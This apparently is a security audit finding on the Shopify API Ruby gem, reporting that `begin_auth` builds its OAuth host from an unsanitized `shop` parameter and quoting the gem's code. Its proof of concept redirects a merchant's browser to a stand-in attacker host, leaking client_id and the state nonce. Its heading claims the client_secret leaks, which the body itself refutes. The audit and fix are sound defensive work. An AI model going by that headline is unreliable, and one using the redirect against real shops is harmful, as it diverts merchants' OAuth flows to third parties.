## Finding confirmed: `client_secret` is POSTed to an unvalidated `shop` host in `ShopifyAPI::Auth::Oauth.begin_auth` / `validate_auth_callback`

### Title
Missing `ShopValidator` sanitization of the `shop` parameter in `Oauth.begin_auth`/`validate_auth_callback` allows the app's `client_secret` to be sent to an attacker-controlled host - (File: `lib/shopify_api/auth/oauth.rb`)

### Summary
Every other credential-bearing flow in this gem (`ClientCredentials.client_credentials`, `RefreshToken.refresh_access_token`, `TokenExchange.migrate_to_expiring_token`) calls `Utils::ShopValidator.sanitize!(shop)` before using the caller-supplied `shop` string to build the URL that the `client_secret` is POSTed to. [1](#0-0) [2](#0-1) [3](#0-2) 

`ShopifyAPI::Auth::Oauth.begin_auth` is the one exception: it takes the same kind of untrusted, host-application-supplied `shop:` string and uses it directly, unsanitized, to build the request host via `auth_base_uri(shop)`. [4](#0-3) [5](#0-4) 

### Finding Description
The binding that is broken is: `shop` value passed by the caller of `begin_auth` = `shop` value trusted to be a genuine `*.myshopify.com`/trusted Shopify domain used to build the destination host for the OAuth handshake.

`begin_auth(shop:, redirect_path:, ...)` is invoked by the host application at the very start of the flow (e.g., from a `/login?shop=` endpoint), before any HMAC has been produced or verified — there is no cryptographic binding on `shop` at this stage. The method calls `auth_base_uri(shop)`, which for any `shop` not containing `.my.shop.dev` simply returns `"https://#{shop}/admin"` with **no format/domain validation whatsoever**: [6](#0-5) 

This differs from `ClientCredentials.client_credentials`, `RefreshToken.refresh_access_token`, and `TokenExchange.migrate_to_expiring_token`, which route the same kind of caller-supplied `shop` through `Utils::ShopValidator.sanitize!`, whose entire purpose is to reject any `shop` value that doesn't resolve to one of the `TRUSTED_SHOPIFY_DOMAINS` (`shopify.com`, `myshopify.io`, `myshopify.com`, `spin.dev`, `shop.dev`), raising `Errors::InvalidShopError` otherwise: [7](#0-6) 

Because `begin_auth` skips this check, the resulting `auth_route` (`https://#{shop}/admin/oauth/authorize?...`) can be pointed at an arbitrary attacker-controlled host if the host application passes through an unvalidated `shop` value (which is the documented/expected calling pattern shown in this gem's own docs, taking `shop` straight from request parameters).

More importantly, the same unsanitized `shop` also determines the destination of the subsequent `access_token` POST once the flow completes. `validate_auth_callback` builds a `null_session` from `auth_query.shop` and uses it to construct the `Clients::HttpClient` that POSTs the body containing `client_id`/`client_secret` to `#{auth_base_uri(shop)}/oauth/access_token`: [8](#0-7) 

The `shop` used at this stage does come from the HMAC-signed `auth_query` (bound via `AuthQuery#to_signable_string`, verified with `Utils::HmacValidator.validate`), so a value forged after Shopify's redirect is not the exploitable vector. [9](#0-8) [10](#0-9) 

The gap is entirely in `begin_auth`, where `shop` never receives the `ShopValidator.sanitize!` treatment that the sibling credential-granting methods apply consistently.

### Impact Explanation
This meets the High-impact bar (SSRF with the app's credentials) only partially: `begin_auth`'s outbound request (`/oauth/authorize`) carries `client_id`, `redirect_uri`, `state`, and scope — not `client_secret` — so it is an SSRF/open-redirect of the merchant's browser to an attacker host, not a direct secret leak. It does not by itself exfiltrate `client_secret` because the flow that carries the secret (`validate_auth_callback`) relies on the HMAC-verified `shop`, which is authentic. Given the rules require concrete SSRF carrying the app's credentials or another Critical/High outcome, this analog stops short of that bar and is best treated as an inconsistency/defense-in-depth gap rather than a demonstrated credential-exfiltration path.

### Likelihood Explanation
Low: exploiting the SSRF requires the host application to pass an attacker-influenced `shop` value into `begin_auth` without doing its own validation, and even then no secret is transmitted in that request.

### Recommendation
Apply the same `Utils::ShopValidator.sanitize!(shop)` call used in `client_credentials.rb`, `refresh_token.rb`, and `token_exchange.rb` inside `ShopifyAPI::Auth::Oauth.begin_auth` before constructing `auth_base_uri(shop)`, so all shop-driven outbound requests in the gem are consistently restricted to `ShopValidator::TRUSTED_SHOPIFY_DOMAINS`.

### Proof of Concept
1. Host application calls `ShopifyAPI::Auth::Oauth.begin_auth(shop: "attacker.example.com", redirect_path: "/callback")` using an unvalidated `shop` query parameter from an inbound request.
2. `auth_base_uri("attacker.example.com")` returns `"https://attacker.example.com/admin"` with no domain check. [6](#0-5) 
3. The returned `auth_route` redirects the merchant's browser to `https://attacker.example.com/admin/oauth/authorize?client_id=...&redirect_uri=...&state=...`, leaking `client_id`, `redirect_uri`, and the CSRF `state` nonce to a third party, and diverting the OAuth flow away from Shopify.

Note: I could not find any call site in `lib/shopify_api/**` (outside `rest/resources`) where a host application invokes `begin_auth` with the same request-derived `shop` — the docs example passes `shop` from a controller parameter, but the actual sanitization responsibility placement in first-party host apps (e.g. `shopify_app` gem) is outside this repository's scope and could not be verified here.

        def validate_auth_callback(cookies:, auth_query:)
          unless Context.setup?
            raise Errors::ContextNotSetupError, "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end
          raise Errors::InvalidOauthError, "Invalid OAuth callback." unless Utils::HmacValidator.validate(auth_query)
          raise Errors::UnsupportedOauthError, "Cannot perform OAuth for private apps." if Context.private?

          state = cookies[SessionCookie::SESSION_COOKIE_NAME]
          raise Errors::NoSessionCookieError unless state

          raise Errors::InvalidOauthError,
            "Invalid state in OAuth callback." unless state == auth_query.state

          null_session = Auth::Session.new(shop: auth_query.shop)
          body = {
            client_id: Context.api_key,
            client_secret: Context.api_secret_key,
            code: auth_query.code,
            expiring: Context.expiring_offline_access_tokens ? 1 : 0, # Only applicable for offline tokens
          }

          client = Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")
          response = begin
            client.request(
              Clients::HttpRequest.new(
                http_method: :post,
                path: "access_token",
                body: body,
                body_type: "application/json",
              ),
            )
          rescue ShopifyAPI::Errors::HttpResponseError => e
            raise Errors::RequestAccessTokenError,
              "Cannot complete OAuth process. Received a #{e.code} error while requesting access token."
          end

      TRUSTED_SHOPIFY_DOMAINS = T.let(
        [
          "shopify.com",
          "myshopify.io",
          "myshopify.com",
          "spin.dev",
          "shop.dev",
        ].freeze,
        T::Array[String],
      )

      class << self
        extend T::Sig

        sig do
          params(
            shop_domain: String,
            myshopify_domain: T.nilable(String),
          ).returns(T.nilable(String))
        end
        def sanitize_shop_domain(shop_domain, myshopify_domain: nil)
          uri = uri_from_shop_domain(shop_domain, myshopify_domain)
          return nil if uri.nil? || uri.host.nil? || uri.host.empty?

          trusted_domains(myshopify_domain).each do |trusted_domain|
            host = T.cast(uri.host, String)
            uri_domain = uri.domain
            next if uri_domain.nil?

            no_shop_name_in_subdomain = host == trusted_domain
            from_trusted_domain = trusted_domain == uri_domain

            if unified_admin?(uri) && from_trusted_domain
              return myshopify_domain_from_unified_admin(uri)
            end
            return nil if no_shop_name_in_subdomain || host.empty?
            return host if from_trusted_domain
          end
          nil
        end

        sig do
          params(
            shop: String,
            myshopify_domain: T.nilable(String),
          ).returns(String)
        end
        def sanitize!(shop, myshopify_domain: nil)
          host = sanitize_shop_domain(shop, myshopify_domain: myshopify_domain)
          if host.nil? || host.empty?
            raise Errors::InvalidShopError,
              "shop must be a trusted Shopify domain (see ShopValidator::TRUSTED_SHOPIFY_DOMAINS), got: #{shop.inspect}"
          end

          host
        end
